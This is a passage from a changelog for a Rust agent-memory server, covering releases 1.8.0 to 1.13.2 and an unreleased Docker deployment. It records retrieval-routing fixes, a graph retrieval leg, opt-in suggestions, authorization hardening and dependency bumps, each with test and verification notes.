  equality against the ingest-kind column, where leg names exist nowhere, and
  `both` is a fusion concept equality can never match. One pure parser
  (`parse_source_filter`) is shared by both handlers so the contract and engine
  cannot drift (`src/search/query.rs`, `src/search/mod.rs`).
- **P1 — `/ingest/memory` returns real chunk ids.** The response used to lie:
  `entry_id` was the *count* of entries added, not a chunk id. It now reports
  `chunk_id` (first real inserted rowid, `null` when nothing added),
  `chunk_ids` (all inserted rowids), `entries_added`, and `duplicates_skipped`.
  `entry_id` is kept as a deprecated alias of `chunk_id` (`src/main.rs`).
- **P2 — `domains_searched` is present on every `/recall` response** (empty
  array when no hits), no longer gated on `provenance`. Telemetry stays
  provenance-gated (`src/handlers/recall.rs`).
- **Docs:** `sources` (plural) is documented as an OR filter over ingest kind
  (not source URIs); MCP schema, CLI help, plugin type, README, API_CONTRACT,
  and openapi all reflect the repaired `source` contract.

No schema migration. Response-shape changes are additive or on the
documented-but-broken `source` contract (422 for invalid values).



## [1.13.2] — 2026-08-06
### Release notes

- **Recall routing regression:** memories moved out of the default domain had become unreachable to standard recall after a domain move; recall now auto-routes to the matching domain with a global fallback.
- **Write contention:** concurrent writers could fail immediately with SQLITE_BUSY under load; writes now queue up to 5 seconds.
- **Improvements:** Un-routed queries never spill into bulk domains, so one huge domain can no longer swamp working-memory lookups; a kill switch restores legacy global-only recall.
- **Improvements:** `/recall` accepts `explain` as an alias for `provenance`; graph traverse accepts `name`/`entity` aliases for `start` — no more per-endpoint spelling quirks.
### Engineering record


**Hardening pass (post-1.13.1 review).**

- **`PRAGMA busy_timeout=5000` on every pool init** (`src/main.rs` main pool,
  `src/domain_registry.rs` `open_with_migration`, `src/migration.rs` pragma
  batch). Previously only `auth/revocation.rs` set a busy timeout, so concurrent
  writers against `POOL_MAX_SIZE=20` connections could fail immediately with
  `SQLITE_BUSY` instead of waiting. Write contention now queues up to 5 s.
- **`POST /recall` accepts `explain` as an alias for `provenance`**
  (`src/handlers/recall.rs`). `GET /search` had always gated telemetry on
  `explain`; `/recall` used `provenance`, so the same intent needed two flag
  names depending on the endpoint. Both spellings now work on `/recall`.
- **`GET /graph/traverse` accepts `name`/`entity` as aliases for `start`**
  (`src/main.rs` `TraverseQuery`). Docs canon is `start` (openapi.yaml, README),
  but the response field is `entity` and sibling routes use `name`/`entity`, so
  callers can now mirror the field back. Back-compat preserved.


**"Recall" fix — automatic retrieval routing (v1.15.0 M1 hotfix).**

Shim-mode recall previously never centroid-routed: `src/handlers/recall.rs` had a
`None if !multi_db` short-circuit that searched the `global` pool only. After
v1.13.0 moved rows into a non-`global` label (`gutmindsynergy`), those rows
became **unreachable by the default recall** the agent uses each turn (a
`k.domain='global'`-scoped search) — a regression introduced by the relabel
migration. This hotfix makes routing automatic on retrieval in shim mode too:

- **Automatic centroid routing on recall.** The routed domain is searched
  primarily, plus a `global` rescue leg (the real working-memory corpus). An
  un-routed query (below `DOMAIN_CONFIDENCE_THRESHOLD`) scopes to `global` and
  **never federates into a bulk domain** — so a 90%-of-rows domain can no longer
  swamp working-memory queries. Pure helper `shim_routing_targets()`.
- **Kill switch** `BRAIN_RECALL_ROUTING_ENABLED` (default on). Set to `false` to
  restore the exact pre-v1.13.1 shim behavior (global-only, no routing) without
  a rebuild.
- 3 new unit tests. Live-verified: a blog query now returns the moved
  `gutmindsynergy` rows (`domains_searched: ['global','gutmindsynergy']`);
  working-memory queries stay in `global`; the kill switch reproduces legacy
  `['global']`.



## [Unreleased]

### Deployment — Docker image + compose (enterprise plan A1) and proxy-SSO guide (B1)

First container story for brain-server (Round 26 enterprise plan, §33):

- **`Dockerfile`** — multi-arch (linux/amd64 + linux/arm64), `debian:bookworm-slim` runtime, non-root `brain` user, `read_only` rootfs + tmpfs, `cap_drop: ALL`, `no-new-privileges`, `/health` healthcheck. The embedding model (`minishlab/potion-retrieval-32M`) is **baked into the image at build time** in the exact hf-hub cache layout (`HF_HOME=/opt/brain-model`), so the container boots offline — no HuggingFace call at first start; pinned revision via `HF_COMMIT` build arg for reproducibility. Loopback-safe default preserved (`BIND_HOST=127.0.0.1`; `BIND_PUBLIC=1` required for public binding).
- **`docker-compose.yml`** — `brain-server` service (loopback-published `127.0.0.1:8765`, `./data` volume for DB/keys/token, healthcheck, read-only + hardened) and an `oauth2-proxy` service behind the `sso` profile (OIDC, Entra/Okta/Keycloak/Auth0-ready). `docker compose up -d` = pilot online in minutes; `docker compose --profile sso up -d` adds the SSO edge.
- **`docs/docker.md`** — image facts, build, run, compose, web-client mount, container backup/restore via the in-image `brain` CLI.
- **`docs/proxy-sso.md`** — reverse-proxy SSO guide: why proxy SSO (server is a token validator, not an OIDC RP), OAuth2-Proxy / Caddy forward-auth / Authentik options, JWT passthrough, IdP matrix, principal handoff, honest limits (native OIDC RP = v1.20 B2).
- **Docs index + README quick start** updated with the Docker path.

No version bump — lands under [Unreleased] until the v1.19.0 release ceremony.



## [1.13.1] — 2026-08-06

### Release notes

- **Memories moved to another domain became unreachable:** default recall never routed by domain in single-database mode, so rows relocated by the 1.13.0 domain-move tool were invisible to the agent's every-turn recall. Routing now works in both modes (matched domain first, with a global rescue leg), and a kill switch restores the exact previous behavior.

## [1.13.0] — 2026-08-06
### Release notes

- **Auto-routing actually works:** ingest never auto-routed (an omitted domain always fell to the default) and domain centroids were computed from a stale legacy table, leaving them effectively empty — nearly everything piled into one domain.
- **Improvements:** Ingest now auto-routes each memory against live domain centroids; an explicit domain still wins, with no extra embedding work.
- **Bulk domain moves:** relabel chunks into a target domain in one transaction, with guards against accidental default-domain drains; CLI included.
- **Centroid rebuild:** a one-shot recompute of every domain centroid from correct data, cleaning up emptied domains; CLI included.
### Engineering record


**"Route" — real domain auto-routing (root-cause fix + relabel migration).**

Fixes the domain-routing lie that shipped at v1.0: ingest never auto-routed
(an omitted domain always fell to `global`), and `recompute_centroid` read the
frozen legacy `embeddings` JSON table (2 rows since v0.9.0) so every centroid
was ~empty. Live DB was 99% in `global`. This release makes auto-routing real
and gives the operator a non-re-ingest migration path. No schema migration —
`knowledge.domain`, `domain_centroids`, and `vec_knowledge` all already exist.

### Changes
- **M1 — centroid source fixed** (`src/domain_router.rs`): new
  `read_domain_vectors` reads `vec_knowledge` (matching `find_near_duplicates`)
  joined to `knowledge` with `valid_to IS NULL` (superseded chunks excluded),
  dequantized via `decode_embedding`. `recompute_centroid` uses it. The old
  code read the frozen `embeddings` table, silently zeroing every centroid.
- **M2 — ingest auto-routing** (`src/handlers/ingest.rs` + `domain_router.rs`):
  `route_domain_label(forced, embedding, centroids)` — an explicit domain wins;
  otherwise the chunk embedding (already computed for insert) is auto-routed
  against the stored centroids, falling back to `global` with no confident
  match. Zero extra embedding work; deterministic (same `route()` recall uses).
- **M3 — `POST /domains/move`** (`src/handlers/domains.rs`): bulk-relabel
  chunks into a target domain in ONE transaction (provenance fields untouched),
  then recomputes affected centroids. Guards: `to` may not be `global`;
  draining `global` requires `?confirm=global` (typo-replay); every id must
  exist; bounded by `MAX_MULTI_GET`. `brain domain-move <id>... --to <domain>
  [--confirm global]` CLI.
- **M4 — `POST /domains/recompute`** (`src/handlers/domains.rs` +
  `domain_router.rs`): one-shot sweep of every known domain's centroid from the
  corrected source, cleaning stale centroids for emptied domains.
  `DOMAIN_MIN_COUNT` knob (default 1 — a no-op unless raised) suppresses
  sub-N domains. `brain domains-recompute` CLI.
- **Deployment runbook (order matters)**: deploy → run `domains-recompute`
  immediately → `domain-move` keyword passes → verify `domains_searched`.

### Verification
- `cargo test --features bench,migrate`: **477 passed, 1 ignored**.
- `cargo clippy --all-targets --features bench,migrate -- -D warnings`: clean.
- `cargo fmt --check`: clean.



## [1.12.2] — 2026-08-04
### Release notes

- **Refresh-token race closed:** two concurrent replays of the same refresh token could both mint access tokens, silently defeating reuse detection; presentations now serialize and the token family burns exactly once.
- **Database stack upgraded:** bundled SQLite 3.51 → 3.53 with tokenizer hardening and security fixes; rusqlite, sqlite-vec, and r2d2 refreshed.
- **Advisory hygiene:** the one unfixable RSA timing advisory is formally documented and accepted (no fixed release exists anywhere); EdDSA keys avoid RSA entirely.
### Engineering record


**"Harden" — audit-fix release (refresh-race serialization + dependency bumps + green CI).**

Deep-stability audit of v1.12.1 surfaced one security race, one stale
dependency stack, and one permanently-red CI job. All three closed.

### Changes
- **`/auth/refresh` check-then-act race fixed** (`src/auth/revocation.rs`):
  `record_refresh_use` + `rotate_chain` ran as two separate steps, so two
  concurrent presentations of the SAME refresh token could both read
  `current_jti == presented`, both pass, and both mint — silently defeating
  reuse detection. New `record_and_rotate` runs the check + rotation under
  `BEGIN IMMEDIATE`: presentations serialize, the loser is detected as reuse,
  and the family is burned exactly once (the burn is committed even when the
  error is returned). Mutation-proven by
  `concurrent_refresh_serializes_exactly_one_winner` (removing the
  `BEGIN IMMEDIATE` makes it fail).
- **Database stack bumped**: rusqlite 0.38.0 → 0.40.1, sqlite-vec 0.1.6 →
  0.1.9, r2d2_sqlite 0.32.0 → 0.35.0. Bundled SQLite rises 3.51.1 → 3.53.2
  (fts3_tokenizer hardening + CVE-2022-35737-related security fixes). The
  v1.11.0-comment concern (`savepoint_with_name(&mut self)`) is unused — the
  codebase uses raw-SQL SAVEPOINT (v1.1.2). `sqlite3_vec_init` FFI unchanged.
- **CI `cargo audit` job turned green**: the sole red job since v1.12.1 was
  RUSTSEC-2023-0071 (rsa 0.9.10 "Marvin" timing sidechannel). Verified
  2026-08-04 that **no fixed release exists anywhere** (rsa 0.10.0-rc.18 and
  jsonwebtoken 11 both still depend on the affected rsa). Accepted with
  documentation in `.cargo/audit.toml` (local-daemon timing model, 0600 keys,
  EdDSA keys avoid RSA entirely since v1.2); rows added to `SECURITY.md` +
  `THREAT_MODEL.md`. Two unmaintained-crate *warnings* remain (number_prefix,
  paste — transitive via model2vec-rs/tokenizers, no failing impact).
- **Docs**: README/CHANGELOG/AGENTS version bump; `.cargo/audit.toml` created.

### Verification
- `cargo test --features bench,migrate`: **466 passed, 1 ignored** (was 465;
  +1 race regression test).
- `cargo clippy --all-targets --features bench,migrate -- -D warnings`: clean.
- `cargo fmt --check`: clean. `cargo audit`: exit 0.
- `cargo build --release --features bench,migrate`: all 5 binaries clean.



## [1.12.1] — 2026-08-04
### Release notes

- **Authorization completed:** ~20 routes (search, stats, get, multi-get, graph, metrics, audit, connectors, and more) relied on "any valid token passes"; every route now enforces its intended read/write/admin action.
- **Security fixes:** Reindex and memory deletion were writer-level actions; both are now admin-only.
- **Audit tenant isolation:** principals can only read their own tenant's audit rows — cross-tenant requests are rejected.
### Engineering record


**"Harden" — AuthZ wiring completion (closes the v1.2 S1 audit finding).**

The v1.2.0 AuthZ layer shipped with `authorize()` called from ~15 handlers and
**20 routes unwired** — every one of those relied on the middleware's "any
valid bearer passes" alone. This release completes the wiring: every
non-public route now enforces its §3.3 matrix action at handler entry.

### Changes
- **20 previously-ungated handlers wired** with the matrix action:
  - Read: `GET /search`, `GET /stats` (domain-scoped), `GET /get/{id}`,
    `POST /multi-get`, `GET /graph/entity/{name}`, `GET /graph/relations`,
    `GET /graph/traverse` (all `X-Brain-Domain`-scoped), `GET /quarantine`,
    `GET /metrics`, `POST /recall` (domain-scoped), `POST /verify`
    (domain-scoped), `POST /consolidate/propose`, `GET /connectors`,
    `GET /domains`, `GET /suggest/metrics`, `GET /procedure/{id}/steps`
  - Write: `POST /v1/embeddings`
  - Admin: `GET /audit`, `GET /audit/verify`, `POST /auth/revoke` (the route
    comment always said "requires admin auth" — now enforced)
- **Two actions upgraded to the matrix**: `POST /reindex` and
  `DELETE /memory/{id}` were Write; §3.3 puts both on the Admin surface.
- **`/audit` tenant scoping**: new `handlers::audit_scope()` — a principal can
  only ever read its own tenant's rows; requesting another tenant's filter is
  a 403 (the matrix's "cross-tenant forbidden"). Superuser (`None` principal,
  opaque mode) keeps the v1.1 passthrough.
- **`AuthHandlerError::forbidden()`** for the revoke gate.

### Tests (+5 → 465 passed, 1 ignored)
- `authz_gates_cover_every_non_public_route` — a 40-route contract table
  (mirrors `test_openapi_covers_routes`) whose source-scan asserts every
  handler body calls `authorize()` with the matrix action. Mutation-proven:
  a wrong action in the table fails the test. A route shipped without a gate
  fails it too.
- `auth_middleware_enforces_presentation_and_public_bypass` +
  `jwt_middleware_requires_jws_in_jwt_mode` — router-level middleware tests
  (new `tower` dev-dep, already in the lock): missing/wrong token → 401,
  valid opaque token → pass, public + `/webhooks/*` bypass, JWT mode 401s
  without a valid JWS.
- `audit_scope_forces_own_tenant_and_blocks_cross_tenant` +
  `audit_scope_none_principal_passes_requested_tenant_through`.

### Back-compat (unchanged behavior in default mode)
- `None` principal = superuser: opaque-token mode has no tenants, so every
  existing install keeps working with zero config change. In JWT mode, opaque
  tokens are already rejected by the JWT layer, so the superuser path is
  unreachable there.
- `/webhooks/{kind}` remains HMAC-verified inside the handler (GitHub cannot
  present a brain bearer token) — by design, not a gap.
- Public routes (`/health`, `/ready`, `/version`, `/openapi.yaml`,
  `/.well-known/*`, `/auth/refresh`, `/auth/logout`) stay gate-free.

### Honest ceilings (carried into v2.0)
- The wiring-guard table is hand-maintained (same convention as the OpenAPI
  coverage test): a new route needs a table row + a gate, or the test fails.
- `?cross_domain=true` on `/graph/traverse` gates on the base domain only.
- Distributed revocation, hot key reload, EC/Ed JWKS emission remain v2.1+
  (unchanged from v1.2).



## [1.12.0] — 2026-08-03
### Release notes

- **Graph ranking corrected:** tag/alias edges no longer outrank true semantic relations around mixed hubs.
- **Noise-aware graph search:** taxonomy edges (tags, aliases) now weigh far less than semantic relations, and mega-hub influence is damped.
- **Graph rescue:** on hard queries that would otherwise come back empty, one bounded graph pass runs automatically before abstaining; a kill switch restores the old abstain-only behavior.
- **Improvements:** Telemetry now shows when a graph rescue fired, so quality is observable.
### Engineering record


**"Discern" — noise-aware graph retrieval + complexity-gated activation
(light cut, roadmap-compliant).**

The v1.11.0 graph leg learns to *discern*: taxonomy edges (`tagged_with` /
`alias_of` — 94% of the live corpus's 2376 edges) weigh 0.1 against semantic
relations, mega-hub outflow is damped (GAAMA `θ = 50`), and the graph leg is
auto-engaged exactly when the query is hard — a `ClarifyQuery` query gets one
bounded graph pass before the v1.5.0 abstention path gives up. **No LLM, no
new schema, no re-ingest, no embeddings in the graph leg** — pure arithmetic
over the existing tables at query time. Research basis: GAAMA
(arXiv:2603.27910), MemORAI (arXiv:2605.01386), "Use Graph When It Needs"
(arXiv:2602.03578); their *arithmetic* only — LLM extraction parts forbidden
per the plan.

### Added
- **`src/search/graph_ppr.rs`**: `type_base_weight()` — `tagged_with`/
  `alias_of` → 0.1, semantic types → 1.0, applied at aggregation (the pair
  SQL now groups by `relation_type`; the weighted sums feed `build_graph`
  unchanged); `SparseGraph::dampen_hubs(θ)` — per-source-node
  `w_ij · min(1, θ/deg(i))`, θ = 50, applied to the reachable-bounded graph
  before PPR. Both deterministic, bounded by the existing `MAX_VISITED`/
  `MAX_PPR_ITER` caps, `#![deny(unsafe_code)]`.
- **Complexity-gated graph rescue** (`src/search/mod.rs` +
  `src/handlers/recall.rs`): when the calibrated estimator says
  `ClarifyQuery` and the caller did not enable `graph`, one bounded
  graph-augmented pass runs and fuses via the shared RRF two-pass fuse;
  abstention is re-scoped to the final outcome (`low_confidence` only when
  `ClarifyQuery` AND zero hits). Strictly additive — the rescued path
  previously returned empty hits.
- **`should_attempt_graph_rescue()`** — pure gate (recommendation, explicit
  `graph`, kill switch); **`config::brain_graph_rescue_enabled()`** behind
  `BRAIN_GRAPH_RESCUE_ENABLED` (default true; `false` restores exact v1.11.0
  abstention). `RetrievalStrategy::HybridGraph` + `SearchTelemetry.graph_rescued`
  for observability; `brain query` telemetry prints it.
- **`fuse_pass_lists()`** — the two-pass RRF fuse extracted from
  `fuse_prf_passes` (which is now a thin wrapper adding `prf_expanded`); the
  graph rescue reuses it without claiming PRF expansion.

### Changed
- `recall.rs` `abstention_decision(recommendation, hits_empty)`: abstains
  only on `ClarifyQuery` with an empty final hit list (v1.5.0 contract
  preserved on the non-rescue path).
- OpenAPI → 1.12.0 (`graph_rescued` on `SearchTelemetry`); README, ROADMAP,
  AGENTS updated.

### Fixed
- Nothing regressed: the v1.11.0 unweighted graph ranked the `tagged_with`
  cloud above semantic neighbors on mixed hubs — pinned by
  `graph_retrieve_weights_semantic_over_tag_cloud` (verified: fails on the
  old arithmetic).

### Tests
- 460 passed / 1 ignored (was 455; +5: `type_base_weight_downgrades_taxonomy_noise`,
  `hub_dampening_scales_heavy_hubs_but_not_light`,
  `graph_retrieve_weights_semantic_over_tag_cloud`,
  `should_attempt_graph_rescue_matrix`,
  `graph_rescue_fuse_does_not_mark_prf_expanded` + the abstention test's
  rescue arm). clippy `-D warnings` + fmt clean.



## [1.11.0] — 2026-08-03
### Release notes

- **Graph retrieval leg (opt-in):** personalized PageRank over the entity knowledge graph joins lexical + vector search, answering multi-hop association questions those two legs can't bridge.
- **Improvements:** Runs concurrently on its own connection with zero added latency when off; per-hit provenance shows the graph rank.
- **Improvements:** Enabled per request on search and recall, plus a CLI flag. No LLM, no schema change, no re-ingest.
### Engineering record


**"Associate" — HippoRAG-2-style graph retrieval (light cut, roadmap-compliant).**

Deterministic Personalized PageRank over the existing `entities`/`relationships`
knowledge graph as a third, opt-in RRF leg (`?graph=true` / `--graph`) on
`/search` + `/recall`. Targets the multi-hop association gap that lexical+vector
retrieval cannot bridge. **No LLM, no new schema, no embeddings in the graph
leg, `< 5W`** — the low-power manifesto holds.

### Added
- **`src/search/graph_ppr.rs`** (pure safe Rust, `#![deny(unsafe_code)]`): a
  sparse undirected weighted entity graph (`SparseGraph`), deterministic
  query→entity seeding via the existing linker vocabulary (case-insensitive
  exact name containment), power-iteration personalized PageRank
  (`π = (1−α)s + α·Pᵀπ`, `α = 0.5` matched to the HippoRAG 2 config default,
  L1 convergence at `1e-6`, bounded at `MAX_PPR_ITER = 50`), reachability
  pruning capped at `trace::MAX_VISITED = 256`, and seed→chunk expansion via
  `relationships.knowledge_id` with the same `flagged=0`/`valid_to IS NULL`
  visibility rules as the other retrievers.
- **Third RRF leg**: `SearchSource::Graph`, `Provenance.graph_rank`,
  `SearchTelemetry.graph_ms`/`graph_candidates`, and a 3-way `rrf_fuse` (the
  same formula, same `RRF_K = 60`). The graph leg runs concurrently on its own
  pooled read connection inside the existing `std::thread::scope`; the disabled
  path pays zero latency (`graph_ms = 0`).
- **Opt-in plumbing**: `graph: bool` on `SearchFilters`, `QueryDoc`,
  `RecallRequest`, GET `/search` `SearchParams`, and `brain query --graph`.
- **4 plan verifications**: `ppr_ranks_connected_entities_higher_than_unrelated`,
  `ppr_seed_from_query_uses_exact_entity_names`, `rrf_fuses_graph_leg_with_vector_and_fts`,
  `ppr_bounded_by_max_visited`, plus the self-loop/zero-weight guards.

### Verification
- `cargo test --features bench,migrate`: **455 passed, 1 ignored** (was 447).
- `cargo clippy --all-targets --features bench,migrate -- -D warnings`: clean.
- `cargo fmt --check`: clean.
- **Live smoke on a copy of the live 8538-doc DB**: `graph=true` returns
  `graph_candidates=107–112`, `graph_ms≈4ms`; exact entity-name queries seed the
  graph leg and surface `source=graph` / `both` hits that the vector+lexical
  legs miss (e.g. `acme_v17c_1785593852 ceo` → the `dave works at acme_v17c` +
  `acme_v17c ceo is carol` pair at `graph_rank 0/1`).

### Honest ceilings (carried into v2.0)
- **Live two-hop quality is corpus-bound**: on the live 8538-doc DB, ~94% of
  KG edges are `tagged_with` taxonomy noise; the graph leg still retrieves
  but the cleanest multi-hop paths are the synthetic `dave/acme/carol` bench
  fixture. The mechanism ships; corpus quality is an operator concern.
- No DPR passage scores in the seed (the plan forbids an embedding in this
  leg) — `PASSAGE_NODE_WEIGHT = 0.05` documents the upgrade path.
- `classify` remains a deterministic keyword router, not a learned classifier.
- `/suggest` still lacks principal/tenant scoping (S1 from the v1.9.1 audit);
  `authorize()` remains unwired — v2.0 multi-tenancy work.



## [1.10.0] — 2026-08-02
### Release notes

- **Classification keyword bug:** the winning category's matched-keywords list was pulled from the wrong lexicon (e.g. HIPAA reported without PII); it is now correct and auditable.
- **Procedural memory:** ingest a procedure with up to 100 ordered steps in one call; steps remain searchable even if embedding fails, and the ordered chain is fetchable with kinds normalized.
- **Deterministic categorization:** classify text into a taxonomy with confidence and matched keywords — no LLM, no cloud.
- **Decision rules:** store JSON decision rules and evaluate them against numeric variables; first matching branch wins, with a citation chain.
- **Memory kinds:** fact/procedure/step/decision taxonomy; legacy 'event' rows relabeled to fact.
### Engineering record


**"Procedural" — ordered steps + deterministic categorization + decision
rules** (the finalized v1.10.0 cut on top of the v1.9.1 hotfix base).

### Added

- **`POST /procedure`** (`src/handlers/procedure.rs`) — ingest a procedure
  root chunk + up to 100 ordered steps in ONE transaction. Steps are stored as
  their own chunks (`node_kind` = `step` / `decision`) linked to the root via
  `next_step` edges carrying an explicit `step_index` (Graphiti's
  NextEpisodeEdge pattern at chunk level, reusing the v0.9.8 `evidence_links`
  table). Embeddings are written best-effort after commit — a failure never
  undoes the ingest (FTS5 keeps the chunks retrievable).
- **`GET /procedure/{id}/steps`** — the ordered step chain for a procedure,
  each step exposing its normalized `memory_kind`. The read path runs through
  `MemoryKind::from_str` so an unknown stored kind falls back to `fact`
  (forward-compat contract, now live code instead of a dead fn).
- **`POST /classify`** — deterministic keyword-router categorization (Mem0's
  premium feature, free): category + confidence + matched keywords (auditable)
  + the full taxonomy. `general` with confidence 0.0 when no keyword clears
  the threshold. No LLM, no cloud.
- **`POST /decision/{id}/evaluate`** — load the decision rule stored as JSON
  on a `decision`-kind chunk and evaluate it against numeric variables. First
  matching branch wins; otherwise the rule's `default_branch`. Returns the
  outcome + citation chain. Pure rule engine (no LLM).
- **`knowledge.node_kind` repurposed** as the Mem0-style `memory_kind`
  (fact/procedure/step/decision). Legacy `'event'` rows relabeled to `'fact'`;
  the column default is now `'fact'` for fresh DBs. `Schema stamp → 1.10.0`.

### Fixed

- **`classify` matched-keywords bug** (`src/procedural.rs`) — the winning
  category was correct but its keyword list came from the wrong lexicon: the
  lookup used the *sorted* `scores` slot as the LEXICON index, and after
  `sort_by` that slot no longer matches the category. Resolved via the
  `CATEGORIES` position (shares LEXICON ordering). Pinned by
  `classify_detects_compliance` (HIPAA + PII now both reported).

### Notes

- Pre-v1.10 DBs keep their `'event'` column default (SQLite can't ALTER a
  column default without a table rebuild); the startup relabel + the read-path
  normalization make the gap cosmetic, not functional — see the `ponytail:`
  comment in `run_migration`.
- Still no background worker and no auto-consolidation — procedures, steps,
  and decisions are explicit, operator- or agent-authored writes.



## [1.9.1] — 2026-08-02
### Release notes

- **Near-duplicate scan fixed:** it read a frozen legacy table and silently covered 2 of ~8,500 live chunks; it now scans the real vector index end to end.
- **Feedback deduplication:** client retries or replays double-counted suggestion feedback, poisoning false-positive metrics; feedback is now last-wins per suggestion per session, with existing duplicates cleaned up.
- **Bug fixes:** Removed a misleading explanation-path code path that collected ids it never used; its docs now match actual behavior.
### Engineering record


**Bug-fix release on top of v1.9.0** (post-release security + correctness audit
of v1.7.0–v1.9.0). Three fixes, no new features.

### Fixed

- **Near-duplicate detection now covers the live corpus** (`consolidate.rs`).
  v1.8.0's `find_near_duplicates` JOINed the legacy `embeddings` JSON table,
  which froze at v0.9.0 — production ingests write only `vec_knowledge`, so on
  the live DB the scan silently covered 2 of 8538 chunks. It now reads
  `embedding_int8` from the vec0 index and dequantizes via the (previously
  dead) `decode_embedding` helper. Regression test ingests two near-identical
  chunks through the real `vec_quantize_int8` path (zero `embeddings` rows)
  and asserts they are proposed.
- **Suggest feedback is last-wins per `(chunk_id, session)`** (`suggest.rs`).
  The v1.9.0 ledger was append-only with no idempotency: a client retry or
  replay recorded duplicate rows, poisoning the false-positive metric that is
  the v1.9 roadmap exit criterion. A unique expression index on
  `(chunk_id, COALESCE(session, ''))` + an upsert make feedback one signal per
  surfaced suggestion per session; a changed mind overwrites instead of
  double-counting. Pre-existing duplicates are deduped before the index is
  created. Schema stamp 1.9.0 → 1.9.1.
- **Removed misleading dead code in `build_explanation_paths`** (`main.rs`).
  The v1.7.0 doc comment claimed intermediate node names were "looked up in a
  single batched query" — no query ran and the collected id set was never used.
  The comment is now honest (intermediates surface as ids; agents resolve via
  `/get/{id}`) and the dead collection is deleted.

### Notes

- Feedback/metrics tenant scoping stays row-level (`tenant_id`), not a full
  `authorize()` gate, and `/suggest` returns content without principal scoping
  — both are safe in the current single-tenant deployment and are carried
  forward as v2.0 multi-tenancy work (the audit flagged them, not this fix).



## [1.9.0] — 2026-08-02
### Release notes

- **Anticipation (opt-in pull):** send what you're working on and get relevant memories you haven't cited yet; superseded and quarantined items are never suggested. No push, no background tracking.
- **Feedback + metrics:** record accept/dismiss per surfaced suggestion and query the false-positive rate by session and time window — the feature's keep-or-remove evidence, made measurable.
- **Kill switch:** all suggestion routes can be disabled without a rebuild.
- **Improvements:** New CLI commands for suggestions, feedback, and metrics.
### Engineering record


**"Suggest" — opt-in, non-interrupting anticipation (light cut).**

This release is the **evidence-gated v1.9 scope** sanctioned by
`IMPLEMENTATION_ROADMAP_v1.5_to_v4.0_EVIDENCE_GATED.md` §v1.9, NOT the
broader Anticipate plan in `IMPLEMENTATION_PLAN_v1.9.0_Anticipate.md` (which
that roadmap explicitly supersedes — same pattern as v1.5–v1.8). Roadmap
v1.9: *"an explicit `POST /suggest` experiment scoped to a session and an
accept/dismiss/false-positive metric."* Exit: *"opt-in suggestions save
measurable time at an acceptable false-positive rate; otherwise the feature
is removed."*

### Discovery

The full Anticipate plan (M1 sessions table + auto-start, M3 short-poll/SSE
push, M4 attention decay, M5 personalization vector) is **forbidden** by the
roadmap's "Do not ship" list ("unsolicited push, ranking decay, hidden
personalization, or SSE by default"). The only surviving scope is the opt-in
pull + the false-positive metric. The session concept survives in its
**client-owned** form (Mem0 `run_id` pattern): the caller passes an opaque
`session` string; the server never auto-tracks, auto-expires, or auto-embeds
a session.

### Shipped

- **`POST /suggest`** — opt-in anticipation pull. Caller supplies explicit
  `context` (what they're working on); server embeds it via the existing
  `StaticModel`, runs `vec0_knn` with an over-fetch equal to `k + exclude.len()`,
  filters out the caller-supplied `exclude` ids, truncates to `k`, and tags
  every hit `provenance.reason = "anticipated"`. Reuses the v1.6.0
  `valid_to IS NULL` default filter, so superseded chunks are never suggested,
  and the v0.9.7 flagged-row exclusion, so quarantined chunks are never
  suggested. No new state, no background work, no push.
- **`POST /suggest/feedback`** — Mem0-style accept/dismiss per surfaced chunk
  (`feedback: accept|dismiss`, optional hashed `reason`, optional `session`).
  Validates the chunk exists (404 on typo so the metric isn't poisoned).
  Tenant-scoped via the JWT principal. The `suggest_feedback` table IS the
  audit surface (append-only, hash-of-reason, tenant-scoped) — no duplicate
  `audit_events` row is written.
- **`GET /suggest/metrics`** — the false-positive rate (dismisses / total)
  over the feedback ledger, with optional `session` / `since` window filters.
  This IS the roadmap exit criterion, made queryable. Tenant-scoped.
- **`BRAIN_SUGGEST_ENABLED` kill switch** (default `true`). When `false`, all
  three routes return `501 Not Implemented` — the roadmap's "otherwise the
  feature is removed" guarantee, without a rebuild.
- **CLI**: `brain suggest`, `brain suggest-feedback`, `brain suggest-metrics`.
- **Migration**: additive `suggest_feedback` table + `schema_version = 1.9.0`
  (was `1.4.0`; v1.5–v1.8 were light cuts with no schema change).
- **OpenAPI** → 1.9.0: three routes + `SuggestionHit`/`SuggestTelemetry`/
  `SuggestMetrics` schemas. `test_openapi_covers_routes` extended.

### Deferred (per evidence-gated roadmap)

- **M1 sessions table + auto-start + 30-min window + running embedding mean**
  — "hidden personalization." The server must not auto-track sessions.
- **M3 short-poll `/events` + SSE push** — "unsolicited push" + "SSE by
  default." `/suggest` is an explicit pull; the agent asks.
- **M4 attention decay + spaced-repetition** — "ranking decay." Feedback is
  purely a measurement signal; it never boosts or demotes retrieval.
- **M5 personalization vector** — "hidden personalization." No per-tenant
  bias vector; `/recall` ranking is unchanged.

### Verification

- `cargo test --features bench,migrate`: **428 passed, 1 ignored** (was 414
  at v1.8.0; +14 = 12 pure-function tests in `suggest.rs` + 2 integration
  tests in `main.rs`).
- `cargo clippy --all-targets --features bench,migrate -- -D warnings`: clean.
- `cargo fmt --check`: clean.
- `cargo build --release --features bench,migrate`: all 5 binaries clean.
- **Live end-to-end smoke** (after `scripts/install-service.sh`, pid 17967):
  `/suggest` returns anticipated chunks (excluded ids correctly dropped,
  telemetry accurate); `/suggest/feedback` records accept+dismiss;
  `/suggest/metrics?session=` returns `false_positive_rate: 0.5` (1/2);
  `BRAIN_SUGGEST_ENABLED=false` → all three routes return `501` while
  `/version` stays `200` (kill switch proven live).

### Honest ceilings (carried into v2.0)

- **No semantic anticipation.** `/suggest` is KNN-over-context with
  exclusions, not a learned next-query predictor. The "anticipated" label is
  a contract marker, not a model output.
- **Session is client-owned.** The server stores the opaque string but does
  no session-boundary detection, no timeout, no embedding mean. Cross-session
  metrics require the caller to label consistently.
- **`accept`/`dismiss` is binary.** Mem0's `VERY_NEGATIVE` is collapsed; a
  future "report-as-harmful" path is v2.x.
- **Metrics are per-process.** The query scans `suggest_feedback` live; no
  rollup materialization. Bounded by the `(tenant_id, ts)` index.
- **Feedback is not retrieval-affecting.** No boost, no decay — the roadmap
  forbids it. The signal is purely for the operator's false-positive
  measurement.
- **Near-duplicate / cross-domain suggest** deferred (per-domain only, like
  the rest of the retrieval stack).



## [1.8.0] — 2026-08-01
### Release notes

- **Undo:** reverse a supersession resolution atomically and idempotently (batch-safe, audited) — the expired fact becomes current again with no retrieval regression.
- **Stale-source detection:** vault files that no longer exist on disk are flagged for operator review; nothing is auto-archived or deleted.
